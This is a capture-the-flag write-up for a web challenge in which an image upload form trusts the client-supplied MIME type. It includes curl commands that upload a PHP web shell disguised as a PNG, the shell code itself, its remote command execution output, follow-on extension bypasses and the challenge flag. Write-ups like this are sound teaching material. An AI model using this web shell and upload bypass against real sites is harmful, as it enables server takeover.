# Upload Your Art

- **Category:** web
- **Points:** 300
- **Branch:** `chal/web-upload-your-art`
- **Target:** `http://54.72.82.22:8160`
- **Status:** ✅ SOLVED

## Flag

```
safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

The success page prints it directly — no exploitation of the uploaded file
required to get the flag.

## Fingerprint

```
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.35
```

Themed page: **"OFF THE WALL"** street-art gallery — "Make your mark. Upload your
work to the city's independent digital gallery." One multipart form, field
`uploaded_file`.

## The bug: MIME validation only

The server inspects **only** the multipart part's `Content-Type`, and trusts the
client for it:

```
upload art.php (default type)  -> ERROR: File type (MIME: application/octet-stream)
                                  is not allowed! Only image/jpeg, image/png,
                                  image/gif are accepted.
upload art.txt                 -> ERROR: File type (MIME: text/plain) ...
```

There is **no extension check, no magic-byte check, and no re-encoding**. The
`Content-Type` of a multipart part is attacker-controlled — it is just a header
on the part.

## Exploitation

Keep the `.php` filename, flip the declared type:

```bash
curl -F 'uploaded_file=@art.php;filename=art.php;type=image/png' \
     http://54.72.82.22:8160/
```

Result:

```
SUCCESS: Uploaded file URL: /uploads/art.php
Your Art Is: safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

The file lands at `/uploads/art.php` and **executes** (the upload dir is not
hardened against PHP):

```php
<?php echo "PWNED"; system($_GET["c"]); ?>
```

```bash
$ curl 'http://54.72.82.22:8160/uploads/art.php?c=id'
PWNEDuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE as `www-data`. Filesystem recon confirms a stock Debian container
(`/.dockerenv`, PHP 8.3, `ls -la /`).

## Notes

- The intended "win" is simply a bypassed upload — the app treats the flag as
  "your art" once it accepts the file.
- The RCE is a bonus surface; there is no `disable_functions` restriction on
  `system()`.
- If a hardened variant blocked execution, the same bypass plus a `.htaccess`
  upload or a `.phtml`/`.php5`/`.phar` extension would be the next step — none
  was needed here.

## Exploit

```bash
echo '<?php system($_GET["c"]); ?>' > art.php
curl -F 'uploaded_file=@art.php;filename=art.php;type=image/png' http://54.72.82.22:8160/
```

See `solve.py`.
